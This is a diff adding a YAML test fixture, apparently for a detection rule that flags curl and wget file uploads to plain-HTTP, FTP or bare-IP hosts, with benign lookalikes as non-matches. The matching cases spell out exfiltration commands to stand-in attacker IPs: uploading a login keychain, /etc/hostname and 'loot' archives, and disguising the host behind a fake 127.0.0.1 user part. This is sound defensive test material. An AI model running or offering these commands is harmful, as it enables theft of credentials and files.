@@ -1,0 +1,26 @@
+match:
+  - desc: "curl -T to an FTP server"
+    events:
+      - {"name": "CreateProcess", "platform": "macos", "proc": {"pid": 5201, "ppid": 4000, "exe": "/usr/bin/curl", "name": "curl", "args": ["curl", "-T", "/tmp/loot.zip", "ftp://203.0.113.9/in/"], "uid": 501, "euid": 501, "is_platform": true, "is_signed": true, "signing_id": "com.apple.curl", "parent": {"pid": 4000, "exe": "/bin/sh", "name": "sh", "is_platform": true, "is_signed": true}}}
+  - desc: "curl -F posts a file to an http URL"
+    events:
+      - {"name": "CreateProcess", "platform": "macos", "proc": {"pid": 5202, "ppid": 4000, "exe": "/usr/bin/curl", "name": "curl", "args": ["curl", "-s", "-F", "f=@/Users/rifqi/Library/Keychains/login.keychain-db", "http://198.51.100.7/u"], "uid": 501, "euid": 501, "is_platform": true, "is_signed": true, "signing_id": "com.apple.curl", "parent": {"pid": 4000, "exe": "/usr/bin/python3", "name": "python3", "is_platform": true, "is_signed": true}}}
+  - desc: "wget --post-file on Linux"
+    events:
+      - {"name": "CreateProcess", "platform": "linux", "proc": {"pid": 24502, "ppid": 24000, "exe": "/usr/bin/wget", "name": "wget", "uid": -1, "euid": -1, "username": "root", "cmdline": "wget --post-file=/etc/hostname http://198.51.100.7/p", "args": ["wget", "--post-file=/etc/hostname", "http://198.51.100.7/p"], "parent": {"pid": 24000, "exe": "/usr/bin/sh", "name": "sh"}}}
+  - desc: "fake localhost user part: http://127.0.0.1@attacker"
+    events:
+      - {"name": "CreateProcess", "platform": "macos", "proc": {"pid": 5203, "ppid": 4000, "exe": "/usr/bin/curl", "name": "curl", "args": ["curl", "-T", "loot.tgz", "http://127.0.0.1@203.0.113.9/up"], "uid": 501, "euid": 501, "is_platform": true, "is_signed": true, "signing_id": "com.apple.curl", "parent": {"pid": 4000, "exe": "/bin/sh", "name": "sh", "is_platform": true, "is_signed": true}}}
+  - desc: "schemeless URL and joined -d@"
+    events:
+      - {"name": "CreateProcess", "platform": "macos", "proc": {"pid": 5204, "ppid": 4000, "exe": "/usr/bin/curl", "name": "curl", "args": ["curl", "-d@/tmp/loot.txt", "203.0.113.9/up"], "uid": 501, "euid": 501, "is_platform": true, "is_signed": true, "signing_id": "com.apple.curl", "parent": {"pid": 4000, "exe": "/bin/sh", "name": "sh", "is_platform": true, "is_signed": true}}}
+nomatch:
+  - desc: "benign lookalike - curl uploads to an https API"
+    events:
+      - {"name": "CreateProcess", "platform": "macos", "proc": {"pid": 5211, "ppid": 4000, "exe": "/usr/bin/curl", "name": "curl", "args": ["curl", "-F", "file=@report.pdf", "https://api.example.org/upload"], "uid": 501, "euid": 501, "is_platform": true, "is_signed": true, "signing_id": "com.apple.curl", "tty": "/dev/ttys002", "parent": {"pid": 4000, "exe": "/bin/zsh", "name": "zsh", "is_platform": true, "is_signed": true}}}
+  - desc: "curl downloads over http (no upload)"
+    events:
+      - {"name": "CreateProcess", "platform": "macos", "proc": {"pid": 5212, "ppid": 4000, "exe": "/usr/bin/curl", "name": "curl", "args": ["curl", "-O", "http://example.org/tool.tar.gz"], "uid": 501, "euid": 501, "is_platform": true, "is_signed": true, "signing_id": "com.apple.curl", "parent": {"pid": 4000, "exe": "/bin/zsh", "name": "zsh", "is_platform": true, "is_signed": true}}}
+  - desc: "curl -T to an https URL with a header"
+    events:
+      - {"name": "CreateProcess", "platform": "macos", "proc": {"pid": 5213, "ppid": 4000, "exe": "/usr/bin/curl", "name": "curl", "args": ["curl", "-T", "build.log", "-H", "X-Run: 1", "https://ci.example.org/logs"], "uid": 501, "euid": 501, "is_platform": true, "is_signed": true, "signing_id": "com.apple.curl", "parent": {"pid": 4000, "exe": "/bin/zsh", "name": "zsh", "is_platform": true, "is_signed": true}}}
